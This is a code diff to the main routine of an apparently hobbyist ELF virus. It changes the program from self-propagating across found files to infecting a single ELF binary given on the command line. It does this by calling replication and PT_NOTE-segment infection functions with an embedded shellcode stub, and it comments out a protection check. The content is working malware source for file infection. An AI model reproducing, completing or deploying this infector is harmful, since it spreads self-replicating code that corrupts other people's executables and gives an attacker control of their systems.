@@ -1,3 +1,4 @@
+#include "debug/debug.h"
 #include "infection/infection.h"
 #include "replication/replication.h"
 #include "protection/protection.h"
@@ -6,12 +7,21 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-int main() {
-    if (protection()) {
-        fprintf(stderr, "Protection failed\n");
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        LOG_DEBUG("Usage: %s {elf file}.\n", argv[0]);
         return 1;
     }
 
+    /*
+    LOG_DEBUG("protection: avoid an unintentional infection");
+    if (protection()) {
+        LOG_DEBUG("Protection failed.");
+        return 1;
+    }
+    */
+
+    // inject `xxd -i stub.bin` here
     unsigned char stub_bin[] = {
       0x50, 0x57, 0x56, 0x52, 0x51, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41,
       0x53, 0xb8, 0x39, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x75,
@@ -34,18 +44,24 @@ int main() {
     unsigned char *payload_bin = NULL;
     size_t payload_size = -1;
 
+    /*
     struct queue files;
     STAILQ_INIT(&files);
     struct entry *f;
+    */
 
     replication(&payload_bin, &payload_size, stub_bin, stub_bin_len);
+    /*
     propagation(&files);
     STAILQ_FOREACH(f, &files, link) {
+        printf("infecting: %s", f->path);
         infect_ptnote(f->path, payload_bin, payload_size);
     }
+    */
+    infect_ptnote(argv[1], payload_bin, payload_size);
 
     free(payload_bin);
-    free_queue(&files);
+    // free_queue(&files);
     return 0;
 }
 
